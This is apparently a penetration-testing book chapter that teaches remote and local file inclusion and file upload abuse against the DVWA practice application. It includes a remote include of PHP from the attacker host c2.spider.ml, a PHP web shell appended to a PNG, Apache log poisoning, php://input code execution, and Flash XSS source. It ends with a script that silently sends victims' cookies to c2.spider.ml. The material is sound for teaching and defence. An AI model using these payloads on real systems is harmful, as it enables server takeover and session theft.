<html><head></head><body><div class="chapter" title="Chapter&#xA0;5.&#xA0;File Inclusion Attacks"><div class="titlepage"><div><div><h1 class="title"><a id="ch05"/>Chapter 5. File Inclusion Attacks</h1></div></div></div><p>In previous chapters, we looked at setting up our environment and getting to know our tools. We even discussed attacking applications by looking for low-hanging fruit. In the same spirit, in this chapter, we will be analyzing file inclusion and upload attacks. While these types of attacks are <a id="id241" class="indexterm"/>not terribly sophisticated, they are still common. File inclusion vulnerabilities have seemingly been around forever and don't appear to be going away anytime soon. <span class="strong"><strong>Local File Inclusion</strong></span> (<span class="strong"><strong>LFI</strong></span>) and <span class="strong"><strong>Remote File Inclusion</strong></span> (<span class="strong"><strong>RFI</strong></span>) vulnerabilities are not the only ways to take advantage of the application and compromise it. File upload <a id="id242" class="indexterm"/>vulnerabilities can be abused, even if the developers have restricted the upload of executable server-side code, as we will see later in the chapter. There is still a surprising amount of applications that are vulnerable to LFI, file upload abuse, and sometimes even RFI.</p><p>In this chapter, we will cover the following topics:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">RFI</li><li class="listitem" style="list-style-type: disc">LFI</li><li class="listitem" style="list-style-type: disc">File upload abuse</li><li class="listitem" style="list-style-type: disc">Chaining vulnerabilities to achieve code execution</li></ul></div><p>If you have spent any amount of time working in the enterprise world, you can no doubt attest to how frequent these issues can <a id="id243" class="indexterm"/>be. Custom in-house applications are often built with deadlines in mind, not security. Enterprise web applications are not the only problem: the <span class="strong"><strong>Internet of things</strong></span> (<span class="strong"><strong>IoT</strong></span>) nightmare is just starting to take hold. The majority of affordable devices, such as Wi-Fi routers or internet-connected plush toys, are designed poorly and once released, are never updated. Due to many constraints, both financial and in terms of hardware limitations, device security is rudimentary, if at all present. IoT devices are the new PHP applications of the 2000s and vulnerabilities we thought were gone are coming back with a vengeance.</p><p>To illustrate these issues, we will be using the <span class="strong"><strong>Damn Vulnerable Web App</strong></span> (<span class="strong"><strong>DVWA</strong></span>) project. This particular application was built to easily showcase the most popular web vulnerabilities seen in the wild. Everything <a id="id244" class="indexterm"/>from command injection to XSS can be tested on three levels of difficulty: low, medium, and hard.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note20"/>Note</h3><p>DVWA can be <a id="id245" class="indexterm"/>downloaded in various formats, including an easy to run live CD, from <a class="ulink" href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a>.</p></div></div><p>To keep things simple, our <a id="id246" class="indexterm"/>instance of DVWA will be accessible via <a class="ulink" href="http://dvwa.app.internal">http://dvwa.app.internal</a>.</p><div class="section" title="RFI"><div class="titlepage"><div><div><h1 class="title"><a id="ch05lvl1sec32"/>RFI</h1></div></div></div><p>Although not as common in <a id="id247" class="indexterm"/>modern applications, RFI vulnerabilities do still pop up from time to time. RFI was popular back in the early days of the web and PHP. PHP was notorious for allowing developers to implement features that were inherently dangerous. The <code class="literal">include()</code> and <code class="literal">require()</code> functions essentially allowed code to be included from other files, either on the same disk or over the wire. This makes web applications more powerful and dynamic but comes at a great cost. As you can imagine, allowing user data to pass to <code class="literal">include()</code> unsanitized can result in application or server compromise.</p><p>The danger of allowing remote files to be included in server-side code is pretty obvious. PHP will download the remote text and interpret it as code. If the remote URL is controlled by the attacker, they could easily feed the application a shell.</p><p>In the following example, the RFI vulnerability can be exploited using a simple <code class="literal">system()</code> passthrough shell. On the attacker-controlled <code class="literal">c2.spider.ml </code>server, a plaintext file containing the shellcode is made available:</p><div class="informalexample"><pre class="programlisting">root@kali:~# curl http://c2.spider.ml/test.txt
<span class="strong"><strong>&lt;?php system('cat /etc/passwd'); ?&gt;</strong></span>
root@kali:~#</pre></div><p>The DVWA application is vulnerable to an RFI attack in the following URL:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/vulnerabilities/fi/</pre></div><p>Attackers can specify an arbitrary page to be included using the <code class="literal">page</code> <code class="literal">GET</code> parameter, like this:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/vulnerabilities/fi/?page=about.php</pre></div><p>Since there is no proper input sanitization on the <code class="literal">page</code> parameter, attackers can specify whatever file they wish the server to load and display, including a remote file hosted elsewhere. Attackers can then <a id="id248" class="indexterm"/>instruct the vulnerable application <code class="literal">dvwa.app.internal</code> to include the remote file, which will be processed as PHP code, essentially resulting in code execution.</p><p>We can specify the full URL to the attacker-controlled URL <code class="literal">http://c2.spider.ml/test.txt</code> as the page to be included, as shown:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/vulnerabilities/fi/?page=http://c2.spider.ml/test.txt</pre></div><div class="mediaobject"><img src="graphics/B09238_05_01.jpg" alt="RFI"/><div class="caption"><p>Figure 5.1: The application includes the remotely hosted PHP code, executes it, and returns the contents of /etc/passwd</p></div></div><p>As mentioned before, RFI bugs are less frequent in modern applications, but thanks to IoT devices with outdated libraries and packages, they are making a comeback.</p><p>There are legitimate reasons for allowing <code class="literal">include()</code> to fetch code over the network. Applications may have been architected around this feature and migrating from it may be too costly. From an enterprise perspective, it may be cheaper to leave the architecture alone and simply patch in controls, and hope to sanitize the input using a whitelist or blacklist approach.</p><p>A whitelist-based control is the ideal choice, but it is also difficult to maintain in a fluid production environment. If domains and IPs are rotated frequently (think CDNs and cloud infrastructure) it may be resource-intensive to update the whitelist to match. Criticality of the application may demand zero downtime; therefore, the solution should be automated. However, this may be difficult to achieve without introducing security flaws.</p><p>A blacklist may be chosen instead, although it is impossible to know all current and future attack input. This is generally discouraged because given enough time, attackers can reverse engineer the blacklist and fashion a bypass. However, a blacklist is still sometimes implemented due to a <a id="id249" class="indexterm"/>lack of resources or time. If an audit finding requires a security control on a particular application component, but it is not very specific on how to accomplish this, it may be quicker to get that compliance checkmark if a blacklist is implemented.</p><p>Controls for limiting RFI can be implemented at the network level. The application egress traffic is scrutinized to only allow connection to known servers, thus preventing the attacker from including code from the C2 server. In theory, this could be a good control. It is a whitelist approach and it does not require redesigning the application workflow. Developers can provide the network security engineers with a list of domains, which should be accessible, and everything else should be dropped.</p></div></div>
<div class="section" title="LFI"><div class="titlepage"><div><div><h1 class="title"><a id="ch05lvl1sec33"/>LFI</h1></div></div></div><p>LFI vulnerabilities are still going strong and will likely not disappear anytime soon. It is often useful for the <a id="id250" class="indexterm"/>application to be able to pull code from other files on the disk. This makes it more modular and easier to maintain. The problem arises when the string passed to the <code class="literal">include</code> directive is assembled in many parts of the application and may include data supplied by an untrusted user.</p><p>A combination of file upload and file inclusion can be devastating. If we upload a PHP shell and it is dumped somewhere on the disk outside of the web directory, an LFI exploit could fetch that code and execute it.</p><p>The DVWA can be used to showcase this type of attack. The <code class="literal">high</code> difficulty setting disallows the uploading of anything but JPEG or PNG files, so we can't just access the uploaded shell directly and execute the code.</p><p>To get around this issue, we can generate a fake PNG file using ImageMagick's <code class="literal">convert</code> command. We will create a small 32×32 pixel image, with a pink background, and save it as <code class="literal">shell.png</code> using the following switches:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~# convert -size 32x32 xc:pink </strong></span>
<span class="strong"><strong>shell.png</strong></span>
</pre></div><p>The file data structure is relatively simple. The PNG header and a few bytes describing the content are automatically generated by the <code class="literal">convert</code> command. We can inspect these bytes using the <code class="literal">hexdump</code> command. The <code class="literal">-C</code> parameter will make the output a bit more readable:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@sol:~# hexdump -C shell.png</strong></span>
<span class="strong"><strong>00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|</strong></span>
<span class="strong"><strong>00000010  00 00 00 20 00 00 00 20  01 03 00 00 00 49 b4 e8  |...... .....I..|</strong></span>
<span class="strong"><strong>00000020  b7 00 00 00 04 67 41 4d  41 00 00 b1 8f 0b fc 61  |.....gAMA......a|</strong></span>
<span class="strong"><strong>00000030  05 00 00 00 20 63 48 52  4d 00 00 7a 26 00 00 80  |....cHRM..z&amp;...|</strong></span>
<span class="strong"><strong>00000040  84 00 00 fa 00 00 00 80  e8 00 00 75 30 00 00 ea  |...........u0...|</strong></span>
<span class="strong"><strong>00000050  60 00 00 3a 98 00 00 17  70 9c ba 51 3c 00 00 00  |'..:....p..Q&lt;...|</strong></span>
<span class="strong"><strong>00000060  06 50 4c 54 45 ff c0 cb  ff ff ff 09 44 b5 cd 00  |.PLTE.......D...|</strong></span>
<span class="strong"><strong>00000070  00 00 01 62 4b 47 44 01  ff 02 2d de 00 00 00 0c  |...bKGD...-.....|</strong></span>
<span class="strong"><strong>00000080  49 44 41 54 08 d7 63 60  18 dc 00 00 00 a0 00 01  |IDAT..c'........|</strong></span>
<span class="strong"><strong>00000090  61 25 7d 47 00 00 00 00  49 45 4e 44 ae 42 60 82  |a%}G....IEND.B'.|</strong></span>
</pre></div><p>There's a lot of strange data but it all contributes to a functional PNG image. It also turns out that we can add arbitrary <a id="id251" class="indexterm"/>bytes to the end of the file and most image viewers will not have a problem rendering the file. We can leverage this knowledge to backdoor the file with some PHP code to be later executed by the server using an LFI exploit.</p><p>First, we need a simple PHP shell, similar to previous chapters. The following shows the PHP code we will append to the PNG file:</p><div class="mediaobject"><img src="graphics/B09238_05_02.jpg" alt="LFI"/><div class="caption"><p>Figure 5.2: Web shell source code</p></div></div><p>Just as before, the <code class="literal">if</code> statement will check that the MD5 hash value of the incoming <code class="literal">password</code> parameter matches <code class="literal">f1aab5cd9690adfa2dde9796b4c5d00d</code>. If there's a match, the command string in the <code class="literal">cmd</code> <code class="literal">GET</code> parameter will be passed to the PHP <code class="literal">system()</code> function, which will execute it as a system command, giving us shell access.</p><p>The MD5 value we're looking for is the hash of <code class="literal">DVWAAppLFI1</code>, as confirmed by the <code class="literal">md5sum</code> Linux command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~# echo -n DVWAAppLFI1 | md5sum</strong></span>
<span class="strong"><strong>f1aab5cd9690adfa2dde9796b4c5d00d  -</strong></span>
<span class="strong"><strong>root@kali:~#</strong></span>
</pre></div><p>We can use the <code class="literal">echo</code> shell command to append (<code class="literal">&gt;&gt;</code>) the PHP code to our <code class="literal">shell.png</code> image:</p><div class="informalexample"><pre class="programlisting">root@kali:~# echo '<span class="strong"><strong>&lt;?php if (md5($_GET["password"]) == "f1aab5cd9690adfa2dde9796b4c5d00d") { system($_GET["cmd"]); } ?&gt;</strong></span>' &gt;&gt; <span class="strong"><strong>shell.png</strong></span>
</pre></div><p>We've seen this passthrough <a id="id252" class="indexterm"/>shell before and it should do the trick for now. We can replace it with a more advanced shell if needed, but for our proof of concept, this should suffice.</p><p>If we inspect the contents of the PNG shell using <code class="literal">hexdump</code>, we can clearly see the PHP shell was written right after the PNG image file structure ends.</p><div class="informalexample"><pre class="programlisting">root@sol:~# hexdump -C shell.png
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  01 03 00 00 00 49 b4 e8  |... ... .....I..|
00000020  b7 00 00 00 04 67 41 4d  41 00 00 b1 8f 0b fc 61  |.....gAMA......a|
00000030  05 00 00 00 20 63 48 52  4d 00 00 7a 26 00 00 80  |.... cHRM..z&amp;...|
00000040  84 00 00 fa 00 00 00 80  e8 00 00 75 30 00 00 ea  |...........u0...|
00000050  60 00 00 3a 98 00 00 17  70 9c ba 51 3c 00 00 00  |'..:....p..Q&lt;...|
00000060  06 50 4c 54 45 ff c0 cb  ff ff ff 09 44 b5 cd 00  |.PLTE.......D...|
00000070  00 00 01 62 4b 47 44 01  ff 02 2d de 00 00 00 0c  <span class="strong"><strong>
</strong></span>|...bKGD...-.....|
00000080  49 44 41 54 08 d7 63 60  18 dc 00 00 00 a0 00 01  |IDAT..c'........|
00000090  61 25 7d 47 00 00 00 00  49 45 4e 44 ae 42 60 82  |a%}G....IEND.B'.|
000000a0  3c 3f 70 68 70 20 69 66  20 28 6d 64 35 28 24 5f  <span class="strong"><strong>|&lt;?php if (md5($_|</strong></span>
<span class="strong"><strong>000000b0  47 45 54 5b 22 70 61 73  73 77 6f 72 64 22 5d 29  |GET["password"])|</strong></span>
<span class="strong"><strong>000000c0  20 3d 3d 20 22 66 31 61  61 62 35 63 64 39 36 39  | == "f1aab5cd969|</strong></span>
<span class="strong"><strong>000000d0  30 61 64 66 61 32 64 64  65 39 37 39 36 62 34 63  |0adfa2dde9796b4c|</strong></span>
<span class="strong"><strong>000000e0  35 64 30 30 64 22 29 20  7b 20 73 79 73 74 65 6d  |5d00d") { system|</strong></span>
<span class="strong"><strong>000000f0  28 24 5f 47 45 54 5b 22  63 6d 64 22 5d 29 3b 20  |($_GET["cmd"]); |</strong></span>
<span class="strong"><strong>00000100  7d 20 3f 3e 0a                                    |} ?&gt;.|</strong></span>
</pre></div><p>For all intents <a id="id253" class="indexterm"/>and purposes, this is still a valid PNG image. Most rendering software should have no problem displaying the contents, a small pink box, as shown:</p><div class="mediaobject"><img src="graphics/B09238_05_03.jpg" alt="LFI"/><div class="caption"><p>Figure 5.3: The backdoored image file displays successfully</p></div></div><p>While DVWA will not actually check whether the file has a valid PNG header, some applications might. Even if the web application has smarter checking than just "does the file name end in <code class="literal">.png</code>?," our shell should go past unnoticed.</p><p>The backdoored PNG file can now be uploaded through the <code class="literal">http://dvwa.app.internal/vulnerabilities/upload/</code> component of DVWA.</p><div class="mediaobject"><img src="graphics/B09238_05_04.jpg" alt="LFI"/><div class="caption"><p>Figure 5.4: The backdoored PNG file successfully uploaded to the target application</p></div></div><p>DVWA is nice enough to tell us where the application stored our file. In real-world scenarios, we may not be so lucky. We'd have to rely on information leaks for the absolute path if the vulnerability <a id="id254" class="indexterm"/>required it. If we can use relative paths in the file inclusion attack, we can try and find the file on disk by systematically moving through the filesystem (<code class="literal">../</code>, <code class="literal">../../</code>, <code class="literal">../../../</code> and so on).</p><p>To make use of our PNG shell, we will use the DVWA file inclusion vulnerability at <code class="literal">http://dvwa.app.internal/vulnerabilities/fi/</code>. The LFI issue is present in the <code class="literal">page</code> parameter via a <code class="literal">GET</code> request. The application allows inclusion of a few files on disk, presumably to be more modular and easier to manage.</p><p>The file inclusion vulnerability is straightforward and essentially allows the user to specify a file on disk to include. There are some security controls that prevent us from including any file we want. Given that this is the DVWA project, we can inspect the source of the application and look at the conditions under which the control may prevent us from accessing our shell.</p><p>This figure shows the source code of the LFI security control. Before the file is included, this particular check is performed:</p><div class="mediaobject"><img src="graphics/B09238_05_05.jpg" alt="LFI"/><div class="caption"><p>Figure 5.5: File inclusion vulnerability source code</p></div></div><p>The <code class="literal">if</code> statement will only allow files to be included if they begin with the word <code class="literal">file</code>, such as <code class="literal">file01.php</code>, or <code class="literal">file02.php</code>. The <code class="literal">include.php</code> file is also allowed to be included. Anything else, such as <code class="literal">http://c2.spider.ml/test.txt</code>, for example, will produce an <code class="literal">ERROR: File not found!</code> message.</p><p>At first glance, this is a fairly stringent control, but there are some issues. This particular control implementation illustrates an important issue with application development and security. In an effort to prevent inclusion attacks, the developers went with the whitelist approach, but due to time <a id="id255" class="indexterm"/>constraints and high maintenance costs, they decided to use string matching instead of an explicit list of files. Ideally, user input should never be passed to the <code class="literal">include</code> (or similar) function at all. Hard-coding values is more secure, but the code is harder to manage. There is always a tradeoff between security and usability, and as attackers, we bank on management going with the more cost effective and typically more insecure option.</p><p>We could name our PNG shell <code class="literal">file.png</code>, but since our uploaded file will reside outside of the vulnerable script's directory, the string we'd have to pass in would need to be an absolute (or relative) path, which would fail to trigger the <code class="literal">if</code> condition shown in the preceding screenshot and the exploit would fail. Once again, PHP's versatility and developer-friendliness comes to the rescue. PHP allows developers to reference files on disk by relative path (<code class="literal">../../../etc/passwd</code>), by absolute path (<code class="literal">/etc/passwd</code>), or using the built-in URL scheme <code class="literal">file://</code>. </p><p>To bypass the upload restriction, we can directly reference the <code class="literal">shell.png</code> file using an absolute path in combination with the <code class="literal">file://</code> scheme, pointing to the <code class="literal">hackable/uploads</code> directory, which the file upload page so graciously told us about.</p><p>On Linux systems, we can make educated guesses as to where on disk the web root folder is. A prime candidate is <code class="literal">/var/www/html/</code>. We can confirm the shell is accessible via the <code class="literal">file://</code> scheme by using the following payload for the <code class="literal">page</code> parameter when calling the vulnerable URL:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/vulnerabilities/fi/?page=<span class="strong"><strong>file:///var/www/html/hackable/uploads/shell.png</strong></span>
</pre></div><p>The Burp Repeater module <a id="id256" class="indexterm"/>can help us to trigger and inspect the results of exploiting this vulnerability, as shown in the following figure:</p><div class="mediaobject"><img src="graphics/B09238_05_06.jpg" alt="LFI"/><div class="caption"><p>Figure 5.6: Successfully including the backdoored PNG using LFI</p></div></div><p>This looks good. In the left column is a raw HTTP <code class="literal">GET</code> request to the vulnerable page using the <code class="literal">file://</code> scheme and the absolute path to our <code class="literal">shell.png</code> for the <code class="literal">page</code> parameter. In the right column, the server response appears to indicate that the file was included and the PHP source code we appended to it is not displayed, meaning it either executed or it was stripped out by a compression or cropping function. The latter would be unfortunate, but we can quickly see whether code execution is successful by trying to trigger the shell through the URL.</p><p>The uploaded shell will execute command strings passed via the <code class="literal">GET</code> parameter <code class="literal">cmd</code> and we can append the <code class="literal">whoami</code> operating system command to our previous payload, and observe the Burp Repeater module's output. We must also provide the expected password via the <code class="literal">password</code> parameter, as show in the following figure:</p><div class="mediaobject"><img src="graphics/B09238_05_07.jpg" alt="LFI"/><div class="caption"><p>Figure 5.7: The backdoored PNG successfully executes the shell command after LFI</p></div></div><p>Success! We now have code execution on the system by taking advantage of two vulnerabilities: poor controls in file upload and LFI. The Repeater <span class="strong"><strong>Request</strong></span> column highlights the command <code class="literal">whoami</code>, being passed to the vulnerable application and the server response confirms that we have achieved our goal of displaying the user <code class="literal">www-data</code> as the context of the application.</p><p>With LFI vulnerabilities, an accompanying file upload feature is not always a requirement. There are other ways to trick the application into executing code. In a scenario where RFI is not possible, there is no file upload feature, or the uploaded file is not accessible by the <code class="literal">include</code> function, we have to get a bit more creative to execute code.</p><p>Not unlike the <code class="literal">file://</code> payload <a id="id257" class="indexterm"/>looking for the uploaded shell, we can reference another file on the system whose contents we control to an extent. Apache web servers, by default, generate an <code class="literal">access.log</code> file somewhere on the disk. This file contains every request sent to the application, including the URL. Experience of some Google-fu tells us that this file is usually in <code class="literal">/var/log/apache2</code> or <code class="literal">/var/log/httpd</code>.</p><p>Since we can't upload our shell through a file upload function, we can, instead, send our shell source code via the URL. Apache will write the request attempt to the access log file and we can include this file using the LFI vulnerability. There will be tons of garbage printed, but more importantly, when PHP encounters our <code class="literal">&lt;?php</code> tag it will begin to execute code.</p><p>We can pass in our shell using a simple HTTP <code class="literal">GET</code> request to the application:</p><div class="mediaobject"><img src="graphics/B09238_05_08.jpg" alt="LFI"/><div class="caption"><p>Figure 5.8: Sending our PHP shell code to the application server log through a GET request</p></div></div><p>The server response is irrelevant, as the <code class="literal">access.log</code> has already been poisoned. On the application server, we can confirm that the shell was written to the log file by looking for it using <code class="literal">grep</code>, as shown:</p><div class="informalexample"><pre class="programlisting">root@dvwa:/# grep system /var/log/apache2/access.log
172.17.0.1 - - "GET<span class="strong"><strong> /&lt;?php if (md5($_GET['password']) == 'f1aab5cd9690adfa2dde9796b4c5d00d') { system($_GET['cmd']); } ?&gt;</strong></span>
<span class="strong"><strong> </strong></span>HTTP/1.1" 404 463 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"</pre></div><p>All that's left to do is use LFI and have PHP execute whatever code is in the log file. As before, we have to provide the <a id="id258" class="indexterm"/>correct password via the <code class="literal">GET</code> request. Our URL payload will contain the <code class="literal">file://</code> scheme and the absolute path to the Apache <code class="literal">access.log</code> file, <code class="literal">/var/log/apache2/access.log</code>, our shell password, and the command to view the contents of the <code class="literal">/etc/passwd</code> file. Since this command is sent via a <code class="literal">GET</code> request parameter, we have to convert the space between <code class="literal">cat</code> and <code class="literal">/etc/passwd</code> with a plus sign, as shown:</p><div class="mediaobject"><img src="graphics/B09238_05_09.jpg" alt="LFI"/><div class="caption"><p>Figure 5.9: Remote code execution via LFI and poisoned Apache log files</p></div></div><p>The server response confirms that the shell command <code class="literal">cat</code> was executed successfully. Somewhere inside all of the <a id="id259" class="indexterm"/>response noise, we can find the contents of <code class="literal">/etc/passwd</code>. There are some obvious stealth issues with this approach. If log files are scrutinized by the defenders, this would stand out like a sore thumb.</p><p>This method may be crude, but it does showcase the extent of the damage a simple file inclusion vulnerability can cause.</p></div>
<div class="section" title="File inclusion to remote code execution"><div class="titlepage"><div><div><h1 class="title"><a id="ch05lvl1sec34"/>File inclusion to remote code execution</h1></div></div></div><p>Similar to the <code class="literal">file://</code> scheme used in the earlier example, the PHP interpreter also provides access to various <a id="id260" class="indexterm"/>input and output streams via the <code class="literal">php://</code> scheme. This makes sense for when PHP is used in a <span class="strong"><strong>command-line interface</strong></span> (<span class="strong"><strong>CLI</strong></span>) and the developer <a id="id261" class="indexterm"/>needs to access these common operating system standard streams: <code class="literal">stdin</code>, <code class="literal">stderr</code>, <code class="literal">stdout</code>, and even the memory. Standard streams are used by applications to communicate with the environment they are executing in. For example, the Linux <code class="literal">passwd</code> will utilize the <code class="literal">stdout</code> stream to display informational messages to the terminal ("Enter your existing password"), <code class="literal">stderr</code> to display error messages ("Invalid password"), and <code class="literal">stdin</code> to prompt for user input to change the existing password.</p><p>The traditional way to parse input coming in from a web client is to read data using the <code class="literal">$_GET</code> and <code class="literal">$_POST</code> superglobals. The <code class="literal">$_GET</code> superglobal provides data that is passed in via the URL, while the <code class="literal">$_POST</code> superglobal contains the <code class="literal">POST</code> body data, neatly parsed.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note21"/>Note</h3><p>A superglobal is a variable that is always set by the PHP interpreter and is accessible throughout the application. <code class="literal">$_GET</code> and <code class="literal">$_POST</code> are the most popular, but there are others, including <code class="literal">$_SESSION</code>, <code class="literal">$_ENV</code>, and <code class="literal">$_SERVER</code>. More information can be found in the PHP manual: <a class="ulink" href="http://php.net/manual/en/language.variables.superglobals.php">http://php.net/manual/en/language.variables.superglobals.php</a>.</p></div></div><p>In a file inclusion vulnerability, the <code class="literal">php://</code> scheme can be leveraged alongside the input (aka <code class="literal">stdin</code>) stream to attack the application. Instead of accessing a resource over the common <code class="literal">http://</code> or <code class="literal">https://</code>, the <code class="literal">php://input</code> URL can be included in the application to <a id="id262" class="indexterm"/>force PHP to read the request body as if it were code and execute it. The input data is retrieved by the interpreter from the body of the request. </p><p>If we pass in the <code class="literal">php://input</code> value as the included page and in the body of the request we enter arbitrary PHP code, the server-side interpreter will read it and execute it, as shown in the following figure:</p><div class="mediaobject"><img src="graphics/B09238_05_10.jpg" alt="File inclusion to remote code execution"/><div class="caption"><p>Figure 5.10: Executing PHP code using LFI</p></div></div><p>The <code class="literal">GET</code> request shown in the preceding screenshot, in the left page, uses the <code class="literal">php://input</code> as the <code class="literal">page</code> parameter, instructing PHP to include code coming in from user input. In a web application setting, input data comes from the body of the request. In this case, the body <a id="id263" class="indexterm"/>contains a simple PHP script that executes the command <code class="literal">cat /etc/passwd</code> on the system. The response reflects the output of <code class="literal">/etc/passwd</code>, confirming that remote code execution was successful.</p><p>No external connections are made and the network-based egress whitelist control has been bypassed. PHP is a feature-rich programming language and there are many ways to accomplish the same thing. This is usually a good thing for attackers, as it provides more opportunity for control bypass, obfuscation, and data exfiltration. This statement is true not only for PHP but other languages as well.</p></div>
<div class="section" title="More file upload issues"><div class="titlepage"><div><div><h1 class="title"><a id="ch05lvl1sec35"/>More file upload issues</h1></div></div></div><p>Earlier in the chapter, we had a look at how file upload can help us to compromise an application and the server it sits on. We were able to upload a valid PNG file containing an embedded PHP shell. The LFI vulnerability allowed us to execute that code.</p><p>There are other problems <a id="id264" class="indexterm"/>with allowing users to upload arbitrary files to the application. You could very well prevent users from uploading PHP, JSP, or ASP shells by simply blacklisting the extension. PHP only executes code in files with a particular extension (or two) if they are called directly. Barring any LFI vulnerability somewhere else in the application, the file upload feature should be fairly safe from a code execution perspective.</p><p>If one of the application features is to allow file storage for users, whitelisting may be difficult and cumbersome to implement. In this scenario, blacklisting extensions may be the most cost-effective solution. When we can't upload a shell or execute server-side code, we can still attack the user.</p><p>The SecLists repository, which we've used in the past, contains a neat Flash file called <code class="literal">xssproject.swf</code> that will allow us to perform XSS attacks on users. Flash code is able to execute JavaScript code just like any other site using Flash plugin <code class="literal">ExternalInterface</code> API.</p><p>The <span class="strong"><strong>ActionScript</strong></span> (<span class="strong"><strong>AS</strong></span>) code used to <a id="id265" class="indexterm"/>generate <code class="literal">xssproject.swf</code> is fairly straightforward. ActionScript is Adobe Flash's programming language used to automate Flash applications. It's very similar to Java in its syntax and just like Java, it is compiled to bytecode and executed by a host application, the Flash plugin:</p><div class="informalexample"><pre class="programlisting">package
{
  import flash.display.Sprite;
  import flash.external.*;
  import flash.system.System;
  public class XSSProject extends Sprite
  {
    public function XSSProject()
    {
      flash.system.Security.allowDomain("*");
      ExternalInterface.marshallExceptions = true;
      try {
        <span class="strong"><strong>ExternalInterface.call</strong></span>("0);}catch(e){};"+<span class="strong"><strong>root.loaderInfo.parameters.js</strong></span>+"//");
      } catch(e:Error) {
        trace(e);
      }
    }
  }
}</pre></div><p>We don't have to be Flash developers to understand what's going on here. This AS code simply wraps the main code in <code class="literal">try</code>-<code class="literal">catch</code> blocks for cleaner execution, grabs the <code class="literal">js</code> parameter from the <code class="literal">GET</code> request using the <code class="literal">root.loaderInfo.parameters</code> object, and passes the contents to the Flash plugin (via <code class="literal">ExternalInterface</code>) for execution within the browser.</p><p>Let's go ahead and upload the XSSProject SWF malicious file using the application's file upload feature. You may need to change the DVWA difficulty to <code class="literal">low</code>, to allow non-image file upload. The following figure shows that the XSSProject malware was uploaded successfully in the familiar directory:</p><div class="mediaobject"><img src="graphics/B09238_05_11.jpg" alt="More file upload issues"/><div class="caption"><p>Figure 5.11: A successful upload of the XSSProject malware</p></div></div><p>To get the Flash file to execute <a id="id266" class="indexterm"/>JavaScript code in the browser, we can call it directly and pass in arbitrary code via the <code class="literal">js</code> parameter, like this:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/hackable/uploads/xssproject.swf?<span class="strong"><strong>js=[javascript code]</strong></span>
</pre></div><p>As a <span class="strong"><strong>proof of concept</strong></span> (<span class="strong"><strong>POC</strong></span>), we can display <a id="id267" class="indexterm"/>the PHP session cookie, but in a real-world attack, we'd want to silently exfiltrate this data and display a benign error message or send the victim back to the main page. For the POC, we can call the <code class="literal">alert()</code> JavaScript function with the value of the cookies set on the particular page. In this case, DVWA's login cookie, <code class="literal">PHPSESSID</code>, should be displayed in a pop - up window.</p><p>To test the POC, we can call the following URL and observe the browser behavior:</p><div class="informalexample"><pre class="programlisting">http://dvwa.app.internal/hackable/uploads/xssproject.swf?js=alert(document.cookie);</pre></div><p>We can use this URL to perform XSS attacks against users of the vulnerable application. Instead of popping up a <a id="id268" class="indexterm"/>window to prove the vulnerability exists, we could inject more useful JavaScript code, such as a <span class="strong"><strong>Browser Exploitation Framework</strong></span> (<span class="strong"><strong>BeEF</strong></span>) hook. We will discuss this tool in <a class="link" href="ch09.html" title="Chapter 9. Practical Client-Side Attacks">Chapter 9</a>, <span class="emphasis"><em>Practical Client-Side Attacks</em></span>.</p><p>The following figure shows that the JavaScript code was injected successfully by the malware (<code class="literal">xssproject.swf</code>):</p><div class="mediaobject"><img src="graphics/B09238_05_12.jpg" alt="More file upload issues"/><div class="caption"><p>Figure 5.12: XSS attack after abusing file upload functionality</p></div></div><p>For a more practical application of the exploit, we can try to exfiltrate the cookie data silently and perhaps use the <code class="literal">PHPSESSID</code> value to impersonate the user in our own browser session. We can grab the cookie data, Base64-encode it with JavaScript's <code class="literal">btoa()</code> function, and send it <a id="id269" class="indexterm"/>all to our C2 server. Once we collect the cookie data, we can force a redirection to the main application page to not raise suspicion. The data exfiltration piece will be transparent to the victim.</p><p>This payload will write new HTML code to the <span class="strong"><strong>Document Object Model</strong></span> (<span class="strong"><strong>DOM</strong></span>) using the <code class="literal">document</code> object. The HTML code is a hidden <code class="literal">iframe</code> element, which makes an HTTP request to our command and control infrastructure. The HTTP request will contain the victim's cookies, Base64-encoded right in the request URL, allowing us to capture this data remotely. The last function to redirect the client to the main page <code class="literal">'/'</code> will trigger after 500 milliseconds. This is to ensure the <code class="literal">iframe</code> has a chance to load and exfiltrate our data.</p><p>Our attack code will look like this:</p><div class="informalexample"><pre class="programlisting">document.write("Loading<span class="strong"><strong>...&lt;iframe style='display:none;' src='//c2.spider.ml/"+btoa(document.cookie)+"'&gt;&lt;/iframe&gt;</strong></span>");
